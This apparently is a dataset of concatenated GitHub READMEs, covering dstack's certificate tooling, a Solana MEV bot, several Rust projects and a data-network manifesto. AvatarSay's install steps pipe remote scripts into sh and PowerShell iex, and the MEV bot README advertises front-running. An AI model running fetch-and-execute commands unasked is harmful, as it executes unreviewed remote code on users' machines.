2024-10-25T07:41:03.095699Z DEBUG certbot::acme_client: creating new order
2024-10-25T07:41:03.250382Z DEBUG certbot::acme_client: order is pending, waiting for authorization
2024-10-25T07:41:03.283600Z DEBUG certbot::acme_client: creating dns record for app.kvin.wang
2024-10-25T07:41:04.027882Z DEBUG certbot::acme_client: challenge not found, waiting 500ms tries=2 domain=""_acme-challenge.app.kvin.wang""
2024-10-25T07:41:04.600711Z DEBUG certbot::acme_client: challenge not found, waiting 1s tries=3 domain=""_acme-challenge.app.kvin.wang""
2024-10-25T07:41:05.642300Z DEBUG certbot::acme_client: challenge not found, waiting 2s tries=4 domain=""_acme-challenge.app.kvin.wang""
2024-10-25T07:41:07.715947Z DEBUG certbot::acme_client: challenge not found, waiting 4s tries=5 domain=""_acme-challenge.app.kvin.wang""
2024-10-25T07:41:11.724831Z DEBUG certbot::acme_client: challenge not found, waiting 8s tries=6 domain=""_acme-challenge.app.kvin.wang""
2024-10-25T07:41:19.815990Z DEBUG certbot::acme_client: challenge not found, waiting 16s tries=7 domain=""_acme-challenge.app.kvin.wang""
2024-10-25T07:41:35.852790Z DEBUG certbot::acme_client: setting challenge ready for https://acme-staging-v02.api.letsencrypt.org/acme/chall-v3/14584884443/mQ-I2A
2024-10-25T07:41:35.934425Z DEBUG certbot::acme_client: challenges are ready, waiting for order to be ready
2024-10-25T07:41:37.972434Z DEBUG certbot::acme_client: order is ready, uploading csr
2024-10-25T07:41:38.052901Z DEBUG certbot::acme_client: order is processing, waiting for challenge to be accepted
2024-10-25T07:41:40.088190Z DEBUG certbot::acme_client: order is valid, getting certificate
2024-10-25T07:41:40.125988Z DEBUG certbot::acme_client: removing dns record 6ab5724e8fa7e3e8f14e93333a98866a
2024-10-25T07:41:40.377379Z DEBUG certbot::acme_client: stored new cert in /home/kvin/codes/meta-dstack/dstack/build/run/certbot/backup/2024-10-25T07:41:40.377174477Z
2024-10-25T07:41:40.377472Z  INFO certbot::bot: checking if certificate needs to be renewed
2024-10-25T07:41:40.377719Z DEBUG certbot::acme_client: will expire in Duration { seconds: 7772486, nanoseconds: 622281542 }
2024-10-25T07:41:40.377752Z  INFO certbot::bot: certificate /home/kvin/codes/meta-dstack/dstack/build/run/certbot/live/cert.pem is up to date
```

Where the command did are:

- Registered to letsencrypt and got a new account `https://acme-staging-v02.api.letsencrypt.org/acme/acct/168601853`
- Auto set CAA records for the domain on cloudflare, you can open the CF dashboard to see the record:

    ![certbot-caa](./docs/assets/certbot-caa.png)

- Auto requested a new certificate from Let's Encrypt. Automatically renews the certificate to maintain its validity

### Launch Tproxy

Execute tproxy with `sudo ./tproxy`, then access the web portal to check the Tproxy-CVM managed Let's Encrypt account. The account's private key remains securely sealed within the TEE.

![tproxy-accountid](./docs/assets/tproxy-accountid.png)

## Certificate transparency log monitor

To enhance security, we've limited TLS certificate issuance to Tproxy via CAA records. However, since these records can be modified through Cloudflare's domain management, we need to implement global CA certificate monitoring to maintain security oversight.

`ct_monitor` tracks Certificate Transparency logs via [https://crt.sh](https://crt.sh/?q=app.kvin.wang), comparing their public key with the ones got from Tproxy RPC. It immediately alerts when detecting unauthorized certificates not issued through Tproxy:

```text
$ ./ct_monitor -t https://localhost:9010/prpc -d app.kvin.wang
2024-10-25T08:12:11.366463Z  INFO ct_monitor: monitoring app.kvin.wang...
2024-10-25T08:12:11.366488Z  INFO ct_monitor: fetching known public keys from https://localhost:9010/prpc
2024-10-25T08:12:11.566222Z  INFO ct_monitor: got 2 known public keys
2024-10-25T08:12:13.142122Z  INFO ct_monitor: ‚úÖ checked log id=14705660685
2024-10-25T08:12:13.802573Z  INFO ct_monitor: ‚úÖ checked log id=14705656674
2024-10-25T08:12:14.494944Z ERROR ct_monitor: ‚ùå error in CTLog { id: 14666084839, issuer_ca_id: 295815, issuer_name: ""C=US, O=Let's Encrypt, CN=R11"", common_name: ""kvin.wang"", name_value: ""*.app.kvin.wang"", not_before: ""2024-09-24T02:23:15"", not_after: ""2024-12-23T02:23:14"", serial_number: ""03ae796f56a933c8ff7e32c7c0d662a253d4"", result_count: 1, entry_timestamp: ""2024-09-24T03:21:45.825"" }
2024-10-25T08:12:14.494998Z ERROR ct_monitor: error: certificate has issued to unknown pubkey: 30820122300d06092a864886f70d01010105000382010f003082010a02820101009de65c767caf117880626d1acc1ee78f3c6a992e3fe458f34066f92812ac550190a67e49ebf4f537003c393c000a8ec3e114da088c0cb02ffd0881fd39a2b32cc60d2e9989f0efab3345bee418262e0179d307d8d361fd0837f85d17eab92ec6f4126247e614aa01f4efcc05bc6303a8be68230f04326c9e85406fc4d234e9ce92089253b11d002cdf325582df45d5da42981cd546cbd2e9e49f0fa6636e747a345aaf8cefa02556aa258e1f7f90906be8fe51567ac9626f35bc46837e4f3203387fee59c71cea400000007c24e7537debc1941b36ff1612990233e4c219632e35858b1771f17a71944adf6c657dd7303583e3aeed199bd36a3152f49980f4f30203010001
```

# Troubleshooting

### Error from teepod: qemu-system-x86_64: -device vhost-vsock-pci,guest-cid=<id>: vhost-vsock: unable to set guest cid: Address already in use

`teepod` may throw this error when creating a new VM if the [Unix Socket CID](https://man7.org/linux/man-pages/man7/vsock.7.html) is occupied. To solve the problem, first, you should list the occupied CID:

```bash
ps aux | grep 'guest-cid='
```

Then choose a new range of the CID not conflicting with the CID in use. You can change `build/teepod.toml` file and restart `teepod`. This error should disappear. For example, you may find 33000-34000 free to use:

```toml
[cvm]
cid_start = 33000
cid_pool_size = 1000
```

When building the dstack from scratch, you should change the CID configs in `build-config.sh` instead, because `teepod.toml` file is generated by `build.sh`. Its content is derived from `build-config.sh`.

You may encounter this problem when upgrading from an older version of dstack, because CID was introduced in `build-config.sh` in later versions. In such case, please follow the docs to add the missing entries in `build-config.sh` and rebuild dstack.

# Contributors

The inspiration for this work stems from [Andrew Miller](https://github.com/amiller)‚Äôs pioneering concept of a [Docker-based P2P TEE SDK](https://collective.flashbots.net/t/dstack-speedrunning-a-p2p-confidential-vm/3876).

Special acknowledgment to [Flashbots](https://github.com/flashbots) for building a community around TEE. The TEE Hacker House initiative, organized by [Flashbots](https://github.com/flashbots) and led by [Tina](https://github.com/CarboClanC), has brought together TEE builders to develop tools for TEE-Web3 integration. This collaborative journey has generated invaluable insights for advancing secure, confidential environments within Web3.

Special recognition goes to the Pi-rateship builders who contributed their expertise:

- Teleport: [Sxy Sun](https://github.com/sxysun)
- Flashbots: [Tina](https://github.com/CarboClanC), [Mateusz](https://github.com/Ruteri), [Dmarz](https://github.com/dmarzzz), [Moe](https://github.com/MoeMahhouk)
- Ithaca: [Georgios](https://github.com/gakonst)
- Fabric: [@gaoist](https://x.com/gaoist)
- Phala Network: [Kevin Wang](https://github.com/kvinwang), [Shelven Zhou](https://github.com/shelvenzhou)
- And many more...

This project cannot be built without standing on the shoulders of giants:

- [konvera/meta-confidential-compute](https://github.com/konvera/meta-confidential-compute)

Together, we‚Äôre shaping the future of TEE in Web3, paving the way for more secure and developer-accessible confidential computing!

For a full list of the direct contributors to this repo, see [Contributors](https://github.com/Dstack-TEE/dstack/contributors) on GitHub.


# License

Copyright 2024 Phala Network and Contributors.

Licensed under the Apache License, Version 2.0 (the ""License""); you may not use this file except in compliance with the License. You may obtain a copy of the License at

[http://www.apache.org/licenses/LICENSE-2.0](http://www.apache.org/licenses/LICENSE-2.0)
",0,0,11,,,26.0
BitFancy/Solana-MEV-Bot-Optimized,main,"<h2 align=""center""><a href=""https://t.me/bitfancy"" target=""_blank"">Hi üëã, I'm a Blockchain Engineer, you can contact meüëàüèª</a></h2>
# Solana MEV Bot

Welcome to the **Solana MEV Bot**! This Rust-based bot is designed for executing Maximal Extractable Value (MEV) strategies on the Solana blockchain.

## Features
- **High-Speed Transactions**: Leverage Solana's low-latency network.
- **Customizable Strategies**: Implement various MEV tactics like arbitrage and front-running.
- **Real-Time Monitoring**: Track performance and optimize strategies easily.

## Getting Started
1. **Clone the Repository**:
   ```bash
   git clone https://github.com/BitFancy/solana-mev-bot-optimized.git
   cd solana-mev-bot-optimized

2. Install Dependencies:
Ensure you have Rust and Cargo installed, then run:
   ```bash
   cargo build
3. Run the bot
   ```bash
   cargo run

##If you need assistant, please contact me <h3 align=""center""><a href=""https://t.me/bitfancy"" target=""_blank"">here üëàüèª</a></h3>
",0,0,2,,rust.yml,1.0
tedsteen/Spotiamp,master,"# Spotiamp

A Spotify client with a Winamp Classic (2.95) look.
It is work in progress, mostly a fun project for me personally to try out Svelte 5 and Tauri 2.
If you like it and miss your favourite Winamp Classic feature add an issue about it or even better create a PR.

Check [releases](https://github.com/tedsteen/Spotiamp/releases/) for MacOS and Windows binaries.
<p align=""center"">
  <img src=""player.png"" alt=""Player""/>
  <br />
  <img src=""playlist.png"" alt=""Playlist""/>
</p>

## Building and running
```bash
# Install all
npm i
cargo install tauri-cli

# After that run this to dev
cargo tauri dev
```

## Update version
```bash
pnpx tauri-version patch # `v0.0.2` -> `v0.0.3` - Commit message `0.0.3`
pnpx tauri-version minor # `v0.0.2` -> `v0.1.0` - Commit message `0.1.0`
pnpx tauri-version major # `v0.0.2` -> `v1.0.0` - Commit message `1.0.0`
```

## Trigger release (run the publish workflow)
```bash
git push origin tag v[version number]
```",5,12,1,,publish.yaml,10.0
StefanTerdell/userp,main,"# Userp

## Work in progress

Warning: This crate is heavily WIP! I'm holding off on doc-comments until I've worked out the module hierarchy and basic API to my satisfaction.

## Summary

This crate provides a high-level user, authentication and session handling system for Axum, and likely Actix later on. The idea is to use it as a base for something like Next Auth but for Leptos, being easy to set up while heavy on features, with including batteris a higher approach than full customizability.

If you need something truly custom you might want to look at the awesome axum-login or oauth2 crates, but if you just want...
1. Users to be able to Log In
2. Reset their Passwords with their verified Email
3. Link their social accounts
4. Manage their multiple Sessions

... Then this might be something for you!

## Screenshots

Before you ask: design PRs are most welcome üòÖ

<table align=""center"">
<tr>
  <td align=""center"">
    <img alt=""A screenshot of the included sign-up screen"" src=""https://raw.githubusercontent.com/StefanTerdell/userp/refs/heads/main/.github/sign-up.png"" width=""320px"" />

  </td>
</tr>
<tr>
  <td align=""center"">
    <img alt=""A screenshot of the included user account management screen"" src=""https://raw.githubusercontent.com/StefanTerdell/userp/refs/heads/main/.github/account-manager.png"" width=""500px"" />
  </td>
</tr>
</table>


## Features

- Login types
  - Username / Password
  - Email magic link
  - Social logins (OAuth)
- Emails
  - Validation
  - Password reset
- Oauth
  - Easily extendable with custom providers
  - Ergonomicly implement user info fetching procedure
  - Optional split callback paths
- Batteries included
  - Askama based templates provide basic login/signup/account pages
  - Growing list of built-in social providers
  - Multiple sessions

## Todo
- [x] Granular feature-controlled templates
- [ ] Replacable templates (by typed Fns returning impl IntoResponse)
- [ ] Webauthn
- [ ] MFA
- [ ] Doc-comments
- [ ] Tests
- [ ] ???
- [ ] Publish!

",0,0,1,ISC,,1.0
rewrite-bigdata-in-rust/RBIR,main,"# RBIR [![](https://img.shields.io/discord/1283371436773212212?logo=discord&label=discord)](https://discord.gg/SshxvYpn)

`RBIR` stands for **Rewrite Bigdata in Rust**. RBIR aims to create a big data ecosystem using Rust.

This project declares our manifesto and serves as a collection of RBIR projects and posts for anyone interested in joining this journey.

## Projects

- [Apache DataFusion Comet](./projects/apache_datafusion_comet.md) [![github-repo](https://img.shields.io/badge/open-repo-blue)](https://github.com/apache/datafusion-comet) [![start-contribute](https://img.shields.io/badge/start-contribute-blue)](https://github.com/apache/datafusion-comet/contribute)

  A high-performance accelerator for [Apache Spark](https://spark.apache.org/), built on top of the powerful [Apache DataFusion](https://github.com/apache/datafusion) query engine.
- [Apache HoraeDB (incubating)](./projects/apache_horaedb_(incubating).md) [![github-repo](https://img.shields.io/badge/open-repo-blue)](https://github.com/apache/horaedb) [![start-contribute](https://img.shields.io/badge/start-contribute-blue)](https://github.com/apache/horaedb/contribute)

  A high-performance, distributed, cloud native time-series database.
- [Arroyo](./projects/arroyo.md) [![github-repo](https://img.shields.io/badge/open-repo-blue)](https://github.com/ArroyoSystems/arroyo) [![start-contribute](https://img.shields.io/badge/start-contribute-blue)](https://github.com/ArroyoSystems/arroyo/contribute)

  A distributed stream processing engine written in Rust, designed to efficiently perform stateful computations on streams of data.
- [BLAZE](./projects/blaze.md) [![github-repo](https://img.shields.io/badge/open-repo-blue)](https://github.com/kwai/blaze) [![start-contribute](https://img.shields.io/badge/start-contribute-blue)](https://github.com/kwai/blaze/contribute)

  The Blaze accelerator for Apache Spark leverages native vectorized execution to accelerate query processing.
- [Daft](./projects/daft.md) [![github-repo](https://img.shields.io/badge/open-repo-blue)](https://github.com/Eventual-Inc/Daft) [![start-contribute](https://img.shields.io/badge/start-contribute-blue)](https://github.com/Eventual-Inc/Daft/contribute)

  A distributed query engine for large-scale data processing in Python and is implemented in Rust.
- [Databend](./projects/databend.md) [![github-repo](https://img.shields.io/badge/open-repo-blue)](https://github.com/datafuselabs/databend) [![start-contribute](https://img.shields.io/badge/start-contribute-blue)](https://github.com/datafuselabs/databend/contribute)

  An open-source cloud data warehouse that serves as a cost-effective alternative to [Snowflake](https://www.snowflake.com/)
- [Fluvio](./projects/fluvio.md) [![github-repo](https://img.shields.io/badge/open-repo-blue)](https://github.com/infinyon/fluvio) [![start-contribute](https://img.shields.io/badge/start-contribute-blue)](https://github.com/infinyon/fluvio/contribute)

  Lean and mean distributed stream processing system written in rust and web assembly. Alternative to [Kafka](https://github.com/apache/kafka) + [Flink](https://github.com/apache/flink) in one.
- [GlareDB](./projects/glaredb.md) [![github-repo](https://img.shields.io/badge/open-repo-blue)](https://github.com/GlareDB/glaredb) [![start-contribute](https://img.shields.io/badge/start-contribute-blue)](https://github.com/GlareDB/glaredb/contribute)

  An analytics DBMS for distributed data.
- [GreptimeDB](./projects/greptimedb.md) [![github-repo](https://img.shields.io/badge/open-repo-blue)](https://github.com/GreptimeTeam/greptimedb) [![start-contribute](https://img.shields.io/badge/start-contribute-blue)](https://github.com/GreptimeTeam/greptimedb/contribute)

  An open-source, cloud-native, unified time series database for metrics, logs and events with SQL/PromQL supported.
- [LanceDB](./projects/lancedb.md) [![github-repo](https://img.shields.io/badge/open-repo-blue)](https://github.com/lancedb/lancedb) [![start-contribute](https://img.shields.io/badge/start-contribute-blue)](https://github.com/lancedb/lancedb/contribute)

  An open-source database for vector-search built with persistent storage, which greatly simplifies retrieval, filtering and management of embeddings.
- [ParadeDB](./projects/paradedb.md) [![github-repo](https://img.shields.io/badge/open-repo-blue)](https://github.com/paradedb/paradedb) [![start-contribute](https://img.shields.io/badge/start-contribute-blue)](https://github.com/paradedb/paradedb/contribute)

  An Elasticsearch alternative built on Postgres.
- [Quickwit](./projects/quickwit.md) [![github-repo](https://img.shields.io/badge/open-repo-blue)](https://github.com/quickwit-oss/quickwit) [![start-contribute](https://img.shields.io/badge/start-contribute-blue)](https://github.com/quickwit-oss/quickwit/contribute)

  Cloud-native search engine for observability. An open-source alternative to [Datadog](https://www.datadoghq.com/), [Elasticsearch](https://www.elastic.co/elasticsearch), [Loki](https://github.com/grafana/loki), and [Tempo](https://github.com/grafana/tempo)
- [RisingWave](./projects/risingwave.md) [![github-repo](https://img.shields.io/badge/open-repo-blue)](https://github.com/risingwavelabs/risingwave) [![start-contribute](https://img.shields.io/badge/start-contribute-blue)](https://github.com/risingwavelabs/risingwave/contribute)

  A Postgres-compatible SQL database engineered to provide the simplest and most cost-efficient approach for processing, analyzing, and managing real-time event streaming data
- [SlateDB](./projects/slatedb.md) [![github-repo](https://img.shields.io/badge/open-repo-blue)](https://github.com/slatedb/slatedb) [![start-contribute](https://img.shields.io/badge/start-contribute-blue)](https://github.com/slatedb/slatedb/contribute)

  A cloud native embedded storage engine built on object storage.
- [TiKV](./projects/tikv.md) [![github-repo](https://img.shields.io/badge/open-repo-blue)](https://github.com/tikv/tikv) [![start-contribute](https://img.shields.io/badge/start-contribute-blue)](https://github.com/tikv/tikv/contribute)

  Distributed transactional key-value database, originally created to complement [TiDB](https://github.com/pingcap/tidb/)
- [influxdb](./projects/influxdb.md) [![github-repo](https://img.shields.io/badge/open-repo-blue)](https://github.com/influxdata/influxdb) [![start-contribute](https://img.shields.io/badge/start-contribute-blue)](https://github.com/influxdata/influxdb/contribute)

  The leading open source time series database for metrics, events, and real-time analytics.


## Libraries

- [Apache Arrow Rust](./libraries/apache_arrow_rust.md) [![github-repo](https://img.shields.io/badge/open-repo-blue)](https://github.com/apache/arrow-rs) [![start-contribute](https://img.shields.io/badge/start-contribute-blue)](https://github.com/apache/arrow-rs/contribute)

  Native Rust implementation of [Apache Arrow](https://github.com/apache/arrow)
- [Apache Avro Rust](./libraries/apache_avro_rust.md) [![github-repo](https://img.shields.io/badge/open-repo-blue)](https://github.com/apache/avro) [![start-contribute](https://img.shields.io/badge/start-contribute-blue)](https://github.com/apache/avro/contribute)

  Rust implementation of [Apache Avro](https://avro.apache.org/)
- [Apache DataFusion](./libraries/apache_datafusion.md) [![github-repo](https://img.shields.io/badge/open-repo-blue)](https://github.com/apache/datafusion) [![start-contribute](https://img.shields.io/badge/start-contribute-blue)](https://github.com/apache/datafusion/contribute)

  An extensible query engine written in Rust that uses [Apache Arrow](https://github.com/apache/arrow) as its in-memory format.
- [Apache Hudi Rust](./libraries/apache_hudi_rust.md) [![github-repo](https://img.shields.io/badge/open-repo-blue)](https://github.com/apache/hudi-rs) [![start-contribute](https://img.shields.io/badge/start-contribute-blue)](https://github.com/apache/hudi-rs/contribute)

  Rust implementation of [Apache Hudi](https://hudi.apache.org/)
- [Apache Iceberg Rust](./libraries/apache_iceberg_rust.md) [![github-repo](https://img.shields.io/badge/open-repo-blue)](https://github.com/apache/iceberg-rust/) [![start-contribute](https://img.shields.io/badge/start-contribute-blue)](https://github.com/apache/iceberg-rust//contribute)

  Rust implementation of [Apache Iceberg](https://iceberg.apache.org/)
- [Apache OpenDAL](./libraries/apache_opendal.md) [![github-repo](https://img.shields.io/badge/open-repo-blue)](https://github.com/apache/opendal) [![start-contribute](https://img.shields.io/badge/start-contribute-blue)](https://github.com/apache/opendal/contribute)

  A unified data access layer, empowering users to seamlessly and efficiently retrieve data from diverse storage services.
- [Apache Orc Rust](./libraries/apache_orc_rust.md) [![github-repo](https://img.shields.io/badge/open-repo-blue)](https://github.com/datafusion-contrib/datafusion-orc) [![start-contribute](https://img.shields.io/badge/start-contribute-blue)](https://github.com/datafusion-contrib/datafusion-orc/contribute)

  Rust implementation of [Apache ORC](https://orc.apache.org/)
- [Apache Paimon Rust](./libraries/apache_paimon_rust.md) [![github-repo](https://img.shields.io/badge/open-repo-blue)](https://github.com/apache/paimon-rust) [![start-contribute](https://img.shields.io/badge/start-contribute-blue)](https://github.com/apache/paimon-rust/contribute)

  Rust implementation of [Apache Paimon](https://paimon.apache.org/)
- [Apache Parquet Rust](./libraries/apache_parquet_rust.md) [![github-repo](https://img.shields.io/badge/open-repo-blue)](https://github.com/apache/arrow-rs) [![start-contribute](https://img.shields.io/badge/start-contribute-blue)](https://github.com/apache/arrow-rs/contribute)

  Rust implementation of [Apache Parquet](https://parquet.apache.org/)


## Posts

- [Rewrite Bigdata in Rust](https://xuanwo.io/2024/07-rewrite-bigdata-in-rust/) by [@Xuanwo](https://github.com/Xuanwo)

",0,11,1,,"autogen.yml,ci.yml",21.0
dotzenith/AvatarSay,main,"<h1 align=""center""> ‚îÅ‚îÅ‚îÅ‚îÅ  ‚ùñ  ‚îÅ‚îÅ‚îÅ‚îÅ </h1>

<!-- BADGES -->
<div align=""center"">
   <p></p>

   <img src=""https://img.shields.io/github/stars/dotzenith/AvatarSay?color=F8BD96&labelColor=302D41&style=for-the-badge"">

   <img src=""https://img.shields.io/github/forks/dotzenith/AvatarSay?color=DDB6F2&labelColor=302D41&style=for-the-badge"">

   <img src=""https://img.shields.io/github/repo-size/dotzenith/AvatarSay?color=ABE9B3&labelColor=302D41&style=for-the-badge"">

   <img src=""https://img.shields.io/github/commit-activity/y/dotzenith/AvatarSay?color=96CDFB&labelColor=302D41&style=for-the-badge&label=COMMITS""/>
   <br>
</div>

<p/>

---

## ‚ùñ AvatarSay

Beautiful quotes from Avatar: The Last Airbender, right in your terminal

  <img src=""https://github.com/dotzenith/dotzenith/blob/main/assets/AvatarSay/quotes.gif"" alt=""quotes gif"">

Note:

AvatarSay uses [viuer](https://github.com/atanunq/viuer) to display the images, but it does not use the [sixel](https://github.com/saitoha/libsixel) feature.

This means it only supports the [kitty](https://sw.kovidgoyal.net/kitty/graphics-protocol/) and [iTerm](https://iterm2.com/documentation-images.html) protocols.

AvatarSay was tested on the following terminal emulators:

- [Kitty](https://sw.kovidgoyal.net/kitty/)
- [WezTerm](https://wezfurlong.org/wezterm/index.html)
- [iTerm](https://iterm2.com/)

---

## ‚ùñ Requirements

AvatarSay uses [AvatarAPI.rs](https://github.com/dotzenith/AvatarAPI.rs) to source the information

As such `AvatarAPIBaseURL` must be set:

```sh
export AvatarAPIBaseURL=""http://avatarquotes.xyz/api""
```

---

## ‚ùñ Installation

#### Shell
```sh
curl --proto '=https' --tlsv1.2 -LsSf https://github.com/dotzenith/AvatarSay/releases/latest/download/avatarsay-installer.sh | sh
```

#### Brew
```sh
brew install dotzenith/tap/avatarsay
```

#### Powershell
```sh
powershell -ExecutionPolicy ByPass -c ""irm https://github.com/dotzenith/AvatarSay/releases/latest/download/avatarsay-installer.ps1 | iex""
```

#### Cargo
```sh
cargo install avatarsay
```

#### Binaries
Pre-Compiled binaries for linux, mac, and windows are available in [Releases](https://github.com/dotzenith/AvatarSay/releases)

#### Source
- First, install [rust](https://rustup.rs/)
```sh
git clone https://github.com/dotzenith/AvatarSay.git
cd AvatarSay
cargo build --release
./target/release/avatarsay
```

---

## ‚ùñ Usage

```
Beautiful quotes from Avatar: The Last Airbender

Usage: avatarsay <COMMAND>

Commands:
  random     Get a random quote
  character  Get a quote from a specfic character
  nation     Get a quote from a character from a specfic nation
  bending    Get a quote from a character with specfic bending ability
  episode    Get a quote from a specfic episode
  book       Get a quote from a specfic book
  valid      Get all valid inputs for any given filter above
  help       Print this message or the help of the given subcommand(s)

Options:
  -h, --help     Print help
  -V, --version  Print version
```

---

## ‚ùñ What's New?

0.1.1 - Initial Release

---

<div align=""center"">

   <img src=""https://img.shields.io/static/v1.svg?label=License&message=MIT&color=F5E0DC&labelColor=302D41&style=for-the-badge"">

</div>
",2,0,1,MIT,release.yml,0.0
picodata/picodata,master,"# Picodata ‚Äì Professional Data Management System for High Loads

This repository contains the source code of Picodata, an in-memory
database with plugins in Rust.

## What is Picodata

Picodata is a software for building professional data management
systems. It provides an in-memory database together with a development
platform and a runtime for custom plugins written in Rust. Learn more
about our software at the [picodata.io] web site.

[picodata.io]: https://picodata.io/picodata/

## Getting Picodata

We provide pre-built Picodata packages for select Linux distributions
including CentOS and Ubuntu. Head over to
[picodata.io/download] to see what is available.

[picodata.io/download]: https://picodata.io/download/

## Running Picodata

Running a Picodata instance only takes one simple command:

```bash
picodata run
```

Getting a basic distributed cluster made of two instances running on
different hosts involves two commands, like this:

```bash
picodata run --listen 192.168.0.1:3301
picodata run --listen 192.168.0.2:3301 --peer 192.168.0.1:3301
```

You can find out more about getting started procedures and first steps
by heading to [docs.picodata.io].

[docs.picodata.io]: https://docs.picodata.io/picodata/stable/

## Building Picodata from source

Please refer to the [CONTRIBUTING.md](CONTRIBUTING.md) document for more
detailed prerequisites, compilation instructions as well as steps
required to run integration tests.
",0,0,11,NOASSERTION,,0.0
SylvanFranklin/srhd,main,"# SRHD
**S**imple **R**ust **H**otkey **D**aemon is a minimal and lightweight key
binding service for MacOS similar to **skhd**. It can be run as in the
background using the native `launchctl` to interact with `launchd` via a plist
file. This functionality has been offloaded to my [launchctl](https://github.com/sylvanfranklin/launchctl) Rust library. 

> [!WARNING]  
> **SRHD** is still in active development, and is lacking certain features like
> hot config reloading and comprehensive error messages. I'm working on rolling
> those out ASAP. There is also currently a bug where if permission are removed
> while srhd is running as a service the keyboard and mouse will become
> unresponsive, and a restart is required. 

## Installation 
The first time **srhd** starts it will request access to input monitoring.
After being granted access you must restart the service for the change to take
effect. __Secure Keyboard Entry__ must be disabled in whatever terminal
emulator **srhd** is started from. In alacritty this process is quite hacky,
and for some reason requires removing input monitoring in system settings. When
something stops working I have found that it can mostly be resolved by toggling
access. 

**Homebrew**
```sh
brew tap sylvanfranklin/srhd 
brew install srhd
srhd start
```

**Cargo**
Requires cargo and rust.    
```sh
cargo install srhd
srhd start
```

**Source** 
Requires cargo and rust.    
```sh
git clone https://github.com/SylvanFranklin/srhd
cd srhd 
cargo run 
```

## Usage
```
Usage: srhd [COMMAND]

Commands:
  start    Start launchctl login service
  stop     Stop launchctl login service
  restart  Restart the service
  help     Print this message or the help of the given subcommand(s)

Options:
  -h, --help     Print help
  -V, --version  Print version
```

## Configuration

For now config is stored at, other options to be added in the future.
- `$HOME/.config/srhd/srhd.toml`

An empty config file will be created automatically the first time **srhd** is started.

**Example Config:** 
```toml
# srhd.toml
[[binding]]
key = ""KeyA""
command = ""open /Applications/Firefox.app"" # or any arbitrary shell script
mods = [""Meta"", ""Alt""]
```

## Debugging
stdout and stderr can be found at `/tmp/$USER_srhd.out.log` and
`/tmp/$USER_srhd.err.log` respecively.

## Contribution
Contribution is greatly appreciated feel free!

",4,4,1,,,2.0
zeroth-robotics/zeroth-bot,main,"<div align=""center"" style=""text-align: center;"">

  <h1>Zeroth Bot</h1>  (WIP)

<p> Super hackable, affordable, and end-to-end (sim2real, RL) 3D-printed open-source humanoid robot platform. Fully open-source, including hardware, SDK, and sim environments. BoM starts at $350. </p>

<p> This project is built by the open-source community and is currently work in progress. We welcome your feedback, issues, and pull requests in GitHub or joining our <a href=""https://discord.gg/G6KP76uha5"">Discord</a>. </p>

<h3>
  <a href=""https://docs.zeroth.bot"">Docs</a>
  <span> ¬∑ </span>
  <a href=""https://docs.zeroth.bot/roadmap"">Roadmap</a>
  <span> ¬∑ </span>
  <a href=""https://discord.gg/G6KP76uha5"">Contribute</a>
  <span> ¬∑ </span>
  <a href=""https://discord.gg/G6KP76uha5"">Community</a>
</h3>

<img width=""1491"" alt=""image"" src=""/public/wave.webp"">

</div>

---
### Project Status
Public Alpha. Zeroth-01 Bot is available for basic locomotion, vision, and speech, but expect breaking changes until 1.0 is reached.

### To start using Zeroth Bot
- Please see the Getting Started documentation at [https://docs.zeroth.bot](https://docs.zeroth.bot).

### To start developing Zeroth Bot
Zeroth Bot is developed by the open-source community. We welcome both pull requests and issues on GitHub.

- Join the community [Discord](https://discord.gg/G6KP76uha5)
- Documentation at [https://docs.zeroth.bot](https://docs.zeroth.bot)

### License
This project is licensed under the MIT License.
",2,2,28,MIT,,34.0
chainbase-labs/manuscript-core,main,"![manuscript](./images/manuscript_logo.jpeg)

[![GitHub Version](https://img.shields.io/github/tag-pre/chainbase-labs/manuscript-core?label=Version&color=D4B68C)](https://github.com/chainbase-labs/manuscript-core/releases)
![PyPI License](https://img.shields.io/pypi/l/quixstreams?label=Licence&color=D4B68C)
[![Docs](https://img.shields.io/badge/docs-chainbase.com-0345b2?label=Docs&color=D4B68C)](https://docs.chainbase.com/core-concepts/manuscript/overview#core-values-and-capabilities-of-manuscript)
<a href=""https://codecov.io/gh/chainbase-labs/manuscript-core""><img src=""https://codecov.io/gh/chainbase-labs/manuscript-core/branch/main/graph/badge.svg"" alt=""codecov""></a>
[![Tests on Linux, MacOS and Windows](https://github.com/chainbase-labs/manuscript-core/actions/workflows/test.yml/badge.svg)](https://github.com//chainbase-labs/manuscript-core/actions?query=workflow%3Acodecov)
[![Go Report Card](https://goreportcard.com/badge/github.com/chainbase-labs/manuscript-core)](https://goreportcard.com)  
[![X](https://img.shields.io/twitter/url?&color=D4B68C&label=&style=social&url=https%3A%2F%2Fx.com%2FchainbaseHQ)](https://x.com/chainbaseHQ)
[![Discord](https://img.shields.io/badge/Chainbase-0345b2?logo=Discord)](https://discord.com/channels/933995010158907422/935156893872185344)
[![Telegram](https://img.shields.io/badge/Chainbase-0345b2?logo=Telegram)](https://t.me/ChainbaseNetwork)

# Build The World's Largest Omnichain Data Network
Chainbase is a global blockchain data network with an extensive dataset and cluster worldwide. If we compare Chainbase‚Äôs global data network to a country, then Manuscript would be the language of this data network nation. Manuscript plays a crucial role in the Chainbase ecosystem, serving as a bridge connecting various data, services, and users.
### what is manuscript?
![manuscript](./images/manuscript_pipeline.png)
Manuscript is not just a language specification; it‚Äôs a protocol, framework, and toolkit designed to simplify and unify data access and processing methods. Through Manuscript, developers and users can more easily interact with the vast amount of data in the Chainbase network, whether querying, analyzing, or applying this data.
The vision of Manuscript is to realize ‚Äúdata trade‚Äù within the Chainbase network, establishing a Chainbase ecosystem component that allows users to access any data through any means, across any service, using any language. This grand vision can be broken down into the following key aspects:

- Any language: We hope users can use scripts in any mainstream programming language to customize data, including but not limited to: Golang, Rust, Python, Node.js, Java, C/C++, Zig, WebAssembly (WASM)
- Any method: Different users are familiar with different forms of data access, we hope users can access data through various means, including but not limited to: SQL, DataFrames, HTTPS, gRPC, FTP, WebDAV, FUSE
- Any data: Users should be able to access data in any format, such as: JSON, CSV, ORC, XML, XLSX, BLOB
- Across any service: Users‚Äô expected data storage services also vary, we hope users can access, transfer, and control data in any service, such as: RPC, S3, IPFS, Azblob, HDFS, Google Drive, BigQuery, WebDAV, MySQL, PostgreSQL
### Value of Manuscript
![manuscript](./images/manuscript_value.png)
- **Programmability**: Manuscript provides powerful programmable interfaces that allow developers to customize data processing workflows according to their needs. This flexibility means that Manuscript can be used not only for simple data queries but also for building complex data analysis pipelines and applications. Through programmability, Manuscript opens up infinite possibilities for innovative applications of blockchain data.

